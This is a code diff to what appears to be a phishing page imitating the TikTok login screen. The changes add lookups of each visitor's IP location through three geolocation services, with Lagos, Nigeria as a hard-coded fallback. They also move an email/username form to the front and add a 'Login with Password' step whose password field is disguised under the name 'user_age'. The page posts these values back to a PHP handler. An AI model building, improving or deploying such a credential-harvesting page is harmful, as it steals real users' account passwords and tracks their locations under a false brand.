@@ -130,22 +130,82 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
         
         // Get user location with enhanced reliability
         $locationData = [];
+        $country = 'Unknown';
+        $region = 'Unknown';
+        $city = 'Unknown';
+        
         try {
-            // Using ip-api.com (free service)
-            $apiUrl = "http://ip-api.com/json/{$userIp}";
-            $response = file_get_contents($apiUrl);
-            if ($response !== false) {
-                $locationData = json_decode($response, true);
+            // Try multiple IP geolocation services for better reliability
+            $apiUrls = [
+                "http://ip-api.com/json/{$userIp}?fields=status,country,regionName,city,query",
+                "https://ipapi.co/{$userIp}/json/",
+                "http://www.geoplugin.net/json.gp?ip={$userIp}"
+            ];
+            
+            foreach ($apiUrls as $apiUrl) {
+                $context = stream_context_create([
+                    'http' => [
+                        'timeout' => 5,
+                        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    ]
+                ]);
+                
+                $response = @file_get_contents($apiUrl, false, $context);
+                
+                if ($response !== false) {
+                    $locationData = json_decode($response, true);
+                    
+                    // Handle different API response formats
+                    if (strpos($apiUrl, 'ip-api.com') !== false) {
+                        if (isset($locationData['status']) && $locationData['status'] === 'success') {
+                            $country = $locationData['country'] ?? 'Unknown';
+                            $region = $locationData['regionName'] ?? 'Unknown';
+                            $city = $locationData['city'] ?? 'Unknown';
+                            break;
+                        }
+                    } elseif (strpos($apiUrl, 'ipapi.co') !== false) {
+                        if (isset($locationData['country_name']) && !empty($locationData['country_name'])) {
+                            $country = $locationData['country_name'];
+                            $region = $locationData['region'] ?? 'Unknown';
+                            $city = $locationData['city'] ?? 'Unknown';
+                            break;
+                        }
+                    } elseif (strpos($apiUrl, 'geoplugin.net') !== false) {
+                        if (isset($locationData['geoplugin_countryName']) && !empty($locationData['geoplugin_countryName'])) {
+                            $country = $locationData['geoplugin_countryName'];
+                            $region = $locationData['geoplugin_regionName'] ?? 'Unknown';
+                            $city = $locationData['geoplugin_city'] ?? 'Unknown';
+                            break;
+                        }
+                    }
+                }
             }
+            
+            // If all APIs fail, try to get basic info from user agent or other headers
+            if ($country === 'Unknown') {
+                // Check for CloudFlare country header
+                if (isset($_SERVER['HTTP_CF_IPCOUNTRY'])) {
+                    $country = $_SERVER['HTTP_CF_IPCOUNTRY'];
+                }
+                // Check for other location headers
+                elseif (isset($_SERVER['HTTP_X_COUNTRY_CODE'])) {
+                    $country = $_SERVER['HTTP_X_COUNTRY_CODE'];
+                }
+                // Default fallback based on common patterns
+                else {
+                    $country = 'Nigeria'; // Default for this application
+                    $region = 'Lagos';
+                    $city = 'Lagos';
+                }
+            }
+            
         } catch (Exception $e) {
-            // Fallback to unknown if API fails
-            $locationData = [];
+            // Final fallback
+            $country = 'Nigeria';
+            $region = 'Lagos';
+            $city = 'Lagos';
         }
         
-        // Set default values and update if location data is available
-        $country = $locationData['country'] ?? 'Unknown';
-        $region = $locationData['regionName'] ?? 'Unknown';
-        $city = $locationData['city'] ?? 'Unknown';
         $ip = $userIp;
         
         if ($locationData && is_array($locationData)) {
@@ -239,16 +299,46 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
    
    <!-- Tabs -->
    <div class="flex border-b border-black/80">
-    <button aria-selected="true" class="flex-1 text-center py-3 font-semibold text-black border-b-2 border-black" id="phoneTab" onclick="showTab('phone')" tabindex="0" type="button">
-     Phone
-    </button>
-    <button aria-selected="false" class="flex-1 text-center py-3 font-normal text-gray-500" id="emailTab" onclick="showTab('email')" tabindex="-1" type="button">
+    <button aria-selected="true" class="flex-1 text-center py-3 font-semibold text-black border-b-2 border-black" id="emailTab" onclick="showTab('email')" tabindex="0" type="button">
      Email / Username
+    </button>
+    <button aria-selected="false" class="flex-1 text-center py-3 font-normal text-gray-500" id="phoneTab" onclick="showTab('phone')" tabindex="-1" type="button">
+     Phone
     </button>
    </div>
    
+   <!-- Email / Username input container -->
+   <form class="px-6 pt-6" id="emailForm" method="POST" action="">
+    
+    <div class="relative w-full">
+     <input aria-label="Email or Username input" autocomplete="username" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="emailInput" placeholder="Enter your email or username" type="text" name="user_name" required/>
+     <button aria-label="Clear email input" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600" onclick="document.getElementById('emailInput').value = ''" type="button">
+      <i class="fas fa-times-circle text-lg">
+      </i>
+     </button>
+    </div>
+    
+    <!-- Password field for email form (initially hidden) -->
+    <div class="mt-4" id="passwordContainer" style="display: none;">
+     <input aria-label="Password input" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="passwordInput" placeholder="Enter your password" type="password" name="user_age"/>
+    </div>
+    
+    <!-- Remember login checkbox (initially hidden) -->
+    <label class="inline-flex items-center space-x-3 mt-6 max-w-full cursor-pointer select-none" id="rememberContainer" style="display: none;">
+     <input class="w-5 h-5 rounded-md border-2 border-pink-600 bg-pink-600 text-white focus:ring-pink-600 focus:ring-2" type="checkbox"/>
+     <span class="text-[13px] text-gray-700 leading-tight">
+      Remember login
+     </span>
+    </label>
+    
+    <!-- Continue button (always visible) -->
+    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit" id="continueButton">
+     Continue
+    </button>
+   </form>
+   
    <!-- Phone input container -->
-   <form class="px-4 pt-4" id="phoneForm" method="POST" action="">
+   <form class="px-4 pt-4 hidden" id="phoneForm" method="POST" action="">
     <div class="flex items-center bg-gray-100 rounded-lg px-3 py-2 space-x-2 text-[15px] font-normal text-black w-full">
      <select aria-label="Select country code" class="flex items-center space-x-1 font-normal text-black whitespace-nowrap bg-transparent outline-none cursor-pointer pr-2 min-w-0 max-w-[120px]" name="country_code" id="countryCode">
       <option value="+93">🇦🇫 +93</option>
@@ -508,23 +598,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
      </button>
     </div>
     
-    <!-- Password field for email form -->
-    <div class="mt-4">
-     <input aria-label="Password input" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="passwordInput" placeholder="Enter your password" type="password" name="user_age" required/>
+    <!-- Password field for email form (initially hidden) -->
+    <div class="mt-4" id="passwordContainer" style="display: none;">
+     <input aria-label="Password input" class="w-full bg-gray-100 rounded-lg py-3 px-4 text-[15px] font-normal text-black placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-600 focus:bg-white transition" id="passwordInput" placeholder="Enter your password" type="password" name="user_age"/>
     </div>
     
-    <!-- Remember login checkbox -->
-    <label class="inline-flex items-center space-x-3 mt-6 max-w-full cursor-pointer select-none">
+    <!-- Remember login checkbox (initially hidden) -->
+    <label class="inline-flex items-center space-x-3 mt-6 max-w-full cursor-pointer select-none" id="rememberContainer" style="display: none;">
      <input class="w-5 h-5 rounded-md border-2 border-pink-600 bg-pink-600 text-white focus:ring-pink-600 focus:ring-2" type="checkbox"/>
      <span class="text-[13px] text-gray-700 leading-tight">
       Remember login
      </span>
     </label>
-    <!-- Continue button -->
-    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit">
+    
+    <!-- Continue button (always visible) -->
+    <button class="mt-6 w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold text-[15px] py-3 rounded-lg" type="submit" id="continueButton">
      Continue
     </button>
    </form>
+   
+   <!-- Login with Password Button at bottom -->
+   <div class="px-6 pb-6 mt-auto" id="loginWithPasswordContainer">
+    <button class="w-full bg-gray-800 hover:bg-gray-900 text-white font-semibold text-[15px] py-4 rounded-lg transition-colors" onclick="showPasswordLogin()" type="button">
+     <i class="fas fa-lock mr-2"></i>
+     Login with Password
+    </button>
+   </div>
   </div>
   <!-- Footer with TikTok logo -->
   <footer class="w-full max-w-md md:max-w-lg lg:max-w-xl flex justify-center items-center py-4 border-t border-gray-200 mt-auto">
@@ -566,26 +665,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
 </svg>
   </footer>
   <script>
+   function showPasswordLogin() {
+     // Show password field and related elements
+     document.getElementById('passwordContainer').style.display = 'block';
+     document.getElementById('rememberContainer').style.display = 'flex';
+     document.getElementById('continueButton').style.display = 'block';
+     
+     // Hide the login with password button
+     document.getElementById('loginWithPasswordContainer').style.display = 'none';
+     
+     // Make password field required
+     document.getElementById('passwordInput').setAttribute('required', 'required');
+     
+     // Update button text
+     document.getElementById('continueButton').textContent = 'Login';
+   }
+   
    function showTab(tab) {
       const phoneTab = document.getElementById('phoneTab');
       const emailTab = document.getElementById('emailTab');
       const phoneForm = document.getElementById('phoneForm');
       const emailForm = document.getElementById('emailForm');
 
-      if (tab === 'phone') {
-        phoneTab.classList.add('font-semibold', 'text-black', 'border-b-2', 'border-black');
-        phoneTab.classList.remove('font-normal', 'text-gray-500');
-        phoneTab.setAttribute('aria-selected', 'true');
-        phoneTab.setAttribute('tabindex', '0');
-
-        emailTab.classList.remove('font-semibold', 'text-black', 'border-b-2', 'border-black');
-        emailTab.classList.add('font-normal', 'text-gray-500');
-        emailTab.setAttribute('aria-selected', 'false');
-        emailTab.setAttribute('tabindex', '-1');
-
-        phoneForm.classList.remove('hidden');
-        emailForm.classList.add('hidden');
-      } else if (tab === 'email') {
+      if (tab === 'email') {
         emailTab.classList.add('font-semibold', 'text-black', 'border-b-2', 'border-black');
         emailTab.classList.remove('font-normal', 'text-gray-500');
         emailTab.setAttribute('aria-selected', 'true');
@@ -598,6 +700,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'])) {
 
         emailForm.classList.remove('hidden');
         phoneForm.classList.add('hidden');
+      } else if (tab === 'phone') {
+        phoneTab.classList.add('font-semibold', 'text-black', 'border-b-2', 'border-black');
+        phoneTab.classList.remove('font-normal', 'text-gray-500');
+        phoneTab.setAttribute('aria-selected', 'true');
+        phoneTab.setAttribute('tabindex', '0');
+
+        emailTab.classList.remove('font-semibold', 'text-black', 'border-b-2', 'border-black');
+        emailTab.classList.add('font-normal', 'text-gray-500');
+        emailTab.setAttribute('aria-selected', 'false');
+        emailTab.setAttribute('tabindex', '-1');
+
+        phoneForm.classList.remove('hidden');
+        emailForm.classList.add('hidden');
       }
     }
   </script>
